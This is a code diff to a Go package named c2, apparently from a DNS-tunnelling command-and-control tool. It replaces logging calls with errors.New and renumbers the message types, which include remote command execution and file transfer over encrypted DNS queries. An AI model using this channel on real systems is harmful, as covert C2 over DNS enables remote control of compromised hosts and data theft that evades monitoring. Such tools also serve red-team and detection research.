@@ -2,12 +2,12 @@ package c2
 
 import (
 	"bytes"
+	"errors"
 	"math/rand"
 	"sort"
 	"strings"
 	"time"
 
-	log "github.com/kpango/glg"
 	"github.com/lunixbochs/struc"
 	"github.com/miekg/dns"
 	"github.com/mosajjal/dnspot/cryptography"
@@ -25,9 +25,10 @@ const (
 	MessageHealthcheck       MessageType = 0
 	MessageSyncTime          MessageType = 1
 	MessageExecuteCommand    MessageType = 2
-	MessageSetHealthInterval MessageType = 3
-	MessageClientSendFile    MessageType = 4
-	MessageClientGetFile     MessageType = 5
+	MessageExecuteCommandRes MessageType = 3
+	MessageSetHealthInterval MessageType = 4
+	MessageClientSendFile    MessageType = 5
+	MessageClientGetFile     MessageType = 6
 	// MessageLogService  Message = 5
 )
 
@@ -111,7 +112,7 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 	}
 	for i := 0; i < len(lims); i++ {
 		if retryCount == 0 {
-			return response, parentPartID, log.Error("Failed to send message after 10 attempts")
+			return response, parentPartID, errors.New("failed to send message after 10 attempts")
 		}
 		if i == len(lims)-1 && len(lims) > 1 {
 			msg.IsLastPart = true
@@ -123,7 +124,7 @@ func PreparePartitionedPayload(msg MessagePacket, payload []byte, dnsSuffix stri
 		struc.Pack(&buf, &msg)
 		encrypted, err := cryptography.Encrypt(serverPublicKey, privateKey, buf.Bytes())
 		if err != nil {
-			return response, parentPartID, log.Errorf("Failed to encrypt the payload", err)
+			return response, parentPartID, errors.New("failed to encrypt the payload")
 		}
 
 		s := cryptography.EncodeBytes(encrypted)
@@ -164,7 +165,7 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 			// verify incoming domain
 			requestWithoutSuffix := strings.TrimSuffix(sub, suffix)
 			if sub == requestWithoutSuffix {
-				return out, log.Errorf("invalid request")
+				return out, errors.New("invalid request")
 			}
 			msgRaw := strings.Replace(requestWithoutSuffix, ".", "", -1)
 			// // padding
@@ -174,12 +175,12 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 
 			msg := cryptography.DecodeToBytes(msgRaw)
 			// if err != nil {
-			// 	return out, log.Errorf("invalid base36 input: %s", msgRaw)
+			// 	return out, errors.New("invalid base36 input: %s", msgRaw)
 			// }
 			// verify signature
 			decrypted, err := cryptography.Decrypt(privatekey, msg)
 			if err != nil {
-				return out, log.Errorf("invalid signature")
+				return out, errors.New("invalid signature")
 			}
 
 			// todo: verify authenticity with public key(s)
@@ -187,7 +188,7 @@ func DecryptIncomingPacket(m *dns.Msg, suffix string, privatekey *cryptography.P
 			o.Signature = cryptography.GetPublicKeyFromMessage(msg)
 			err = struc.Unpack(bytes.NewBuffer(decrypted), &o.Msg)
 			if err != nil {
-				return out, log.Errorf("couldn't unpack message")
+				return out, errors.New("couldn't unpack message")
 			}
 			out = append(out, o)
 		}
